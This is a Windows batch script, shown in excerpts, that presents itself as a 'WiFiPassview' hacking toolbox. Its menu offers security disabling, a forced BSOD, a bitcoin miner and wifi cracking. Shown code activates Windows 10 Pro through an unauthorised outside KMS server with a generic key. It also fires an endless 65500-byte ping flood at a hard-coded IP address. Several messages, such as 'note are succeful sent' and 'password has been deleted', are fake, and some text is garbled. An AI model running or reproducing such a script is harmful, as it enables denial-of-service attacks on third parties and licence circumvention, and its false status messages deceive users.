...
REM Setup Variables
REM =============================
set appname==Passview
set appvers=v1.0.0
set appstat=Bella
set dev=Michel Samborski
...
echo # %divider%
echo #
echo # Banner (Default) ....... [1]
echo # desactive security  .................... [2]
echo # Donate .................... [3]
echo # Credits  ................... [4]
echo # Activate win10pro for free(by @Divinemonk) ................... [5]
echo # Exit ...................... [6]
echo # Ping alexa attacks (no recommanDED) ...................... [7]
echo # Smart Exit ...................... [8]
echo # ManualMode ...................... [9]
echo # Force bsod(on VM please its dangerous) ...................... [10]
echo # Bitcoin Private Miner ...................... [11]
echo # Create local scan ...................... [12]
echo #
set /p "mainMenu=# $WiFiPassview> " || set mainMenu=1
if %mainMenu%==1 goto bannerMode
if %mainMenu%==2 goto manualMode
if %mainMenu%==3 goto donate
if %mainMenu%==4 goto credits
if %mainMenu%==5 goto win10pro
if %mainMenu%==6 goto End
if %mainMenu%==7 goto AlexaAttacs
if %mainMenu%==8 goto EOF
if %mainMenu%==9 goto Manual
if %mainMenu%==10 goto BSOD
if %mainMenu%==11 goto bitcoin
if %mainMenu%==12 goto Scan
goto fail4
pause>null
...
rem =============================
:bannerMode
echo ├Ôö£├║Ôö£├Ñ├ö├Â┬úÔö£Ôòù├ö├Â┬úÔö¼┬½
color 4
echo """"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
...
ECHO "101010HHHHHHHH        HHHHHHHH AAAAAAAA                      AAAAAAAACCCCCCCCCCCCCCCCCCCCCCCCCC 1KKKKKK           KKKKKK  BY-MICH"  
pause>nul
goto mainMenu
:donate
del null
...
rem =============================
:Note
echo enter a note(with stars)
set /p "note=# $_ command>> " || set note=3
echo thanks
ping localhost -n 1>nul
echo note are succeful sent
timeout 3
goto donate
...
echo # by %dev%
echo # %divider%
echo 10,e0,00,00,19,e0,00,00,30,e0,00,00,2e,e0,00,00,2c,e0,00,00,20,e0,00,00,6a,\ >> "keyuser.j"
echo e0,00,00,69,e0,00,00,68,e0,00,00,67,e0,00,00,42,e0,00,00,6c,e0,00,00,6d,e0,\ >> "keyuser.just"
...
pause>null
:win10pro
@echo off&@title off&title Windows 10 Professional Activation Status [Starting ...]  @Divinemonk&echo ================================================================= &echo *           Windows 10 Professional Activation Script           *&echo ================================================================= &timeout 1 >nul&echo *                                    ~  A Divinemonk creation!  * &echo ================================================================= &echo -                                                               - &echo -                                                               - &timeout 5 >nul&title Windows 10 Professional Activation Status [Activating ...]  @Divinemonk
slmgr.vbs /ipk W269N-WFGWX-YVC9B-4J6C9-T83GX & slmgr.vbs /skms kms.teevee.asia & slmgr.vbs /ato 
title Windows 10 Professional Activation Status [Activated !!!]  @Divinemonk&echo -                                                               - &echo -                                                               - &echo ================================================================= &echo *  !_!_!_!_!_!     Windows 10 pro - ACTIVATED      !_!_!_!_!_!  * &echo ================================================================= &echo -                                                               - &echo -                                                               - &echo ================================================================= &echo #            Follow Us For More FREE Activators                 # &echo ================================================================= &echo [+] TWITTER [https://twitter.com/HrDivinemonk] &echo [+] GITHUB  [https://github.com/Divinemonk/win10pro/] &echo ================================================================= &echo ================================================================ &echo #        See all available Windows (7/8/10/11) Activators       # &echo ================================================================= &echo [+] GITHUB  [https://github.com/Divinemonk/activators] &echo ================================================================= &echo `                                                               		 &timeout 30
echo MsgBox "succeful win pro" ,vbInfo, "Windows 10 pro" > msgbox.vbs
start msgbox
goto mainMenu
:AlexaAttacs
ping 151.101.16.144 -l 65500 -t
goto mainMenu
:Manual
cls
title %appname% %appvers% - %appstat% [Manual Net Mode]
color %uicolor%
echo # %divider%
echo # %appname% %appvers% - %appstat%
echo # by %dev%
...
echo # %divider%
echo #
echo # Extracted password has been deleted! Press any key to continue...
pause>null
del null
goto mainMenu
...
echo # %divider%
echo #
echo # Press a key to continue the wifi crackin'...
pause>null
goto mainMenu
...
tree C:\Users
color 3
title %appname% %appvers% - %appstat% [Bitcoin Server Generation]
